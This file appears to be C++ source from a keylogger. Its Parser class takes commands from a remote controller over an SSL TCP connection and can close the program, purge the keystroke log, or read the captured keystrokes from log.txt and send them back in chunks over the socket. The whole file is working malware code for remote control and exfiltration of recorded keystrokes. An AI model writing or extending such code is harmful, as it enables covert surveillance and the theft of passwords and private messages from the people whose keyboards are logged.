#include <fstream>

#include "SSLTCPClient.hpp"
#include "Parser.hpp"


Parser::Parser(SSLTCPClient &client) :
	m_client(client)
{
}


Parser::~Parser()
{
}

void Parser::closeCommand(t_cmd *command)
{
	if (command->cmd == commandType::CLOSE)
	{
		exit(0);
	}
}

void Parser::purgeCommand(t_cmd *command)
{
	if (command->cmd == commandType::PURGE_LOG)
	{
		KeyLogger::getInstance().stopRecording();
		std::cout << "Log Purge...";
		KeyLogger::getInstance().purgeLog();
		std::cout << " Done" << std::endl;
		KeyLogger::getInstance().startRecording();
	}
}

void Parser::downloadCommandSendDataLoop(std::ifstream &file, t_cmd &tosend)
{
	if (file.is_open())
	{
		while (file.read(tosend.buffer, buffer_size))
		{
			tosend.cmd = commandType::DOWNLOAD_LOG;
			tosend.data_len = file.gcount();
			m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
		}
	}
	else
	{
		std::cout << "Could not open file" << std::endl;
	}
}

void Parser::downloadCommand(t_cmd *command)
{
	if (command->cmd == commandType::DOWNLOAD_LOG)
	{
		std::ifstream file("./log.txt");
		std::cout << "Sending log...";
		t_cmd tosend;
		KeyLogger::getInstance().stopRecording();
		m_client.blockSocket();
		downloadCommandSendDataLoop(file, tosend);
		file.close();
		tosend.cmd = commandType::DOWNLOAD_LOG_END;
		tosend.data_len = 0;
		m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
		m_client.unblockSocket();
		std::cout << " Done" << std::endl;
		KeyLogger::getInstance().startRecording();
	}
}

void Parser::displayCommandSendDataLoop(std::ifstream &file, t_cmd &tosend)
{
	if (file.is_open())
	{
		while (file.read(tosend.buffer, buffer_size))
		{
			tosend.cmd = commandType::DISPLAY_LOG;
			tosend.data_len = file.gcount();
			m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
		}
	}
}

void Parser::displayCommand(t_cmd *command)
{
	if (command->cmd == commandType::DISPLAY_LOG)
	{
		std::ifstream file("./log.txt");
		std::cout << "Sending log...";
		t_cmd tosend;
		KeyLogger::getInstance().stopRecording();
		m_client.blockSocket();
		displayCommandSendDataLoop(file, tosend);
		file.close();
		tosend.cmd = commandType::DISPLAY_LOG_END;
		tosend.data_len = 0;
		m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
		m_client.unblockSocket();
		std::cout << " Done" << std::endl;
		KeyLogger::getInstance().startRecording();
	}
}

void Parser::parseCommands()
{
	int read = m_client.receiveData(&m_buffer, sizeof(t_cmd));
	if (read > 0 && WSAGetLastError() != EAGAIN && WSAGetLastError() != EWOULDBLOCK && read == sizeof(t_cmd))
	{
		t_cmd *command = reinterpret_cast<t_cmd *>(m_buffer);
		this->closeCommand(command);
		this->purgeCommand(command);
		this->downloadCommand(command);
		this->displayCommand(command);
	}
}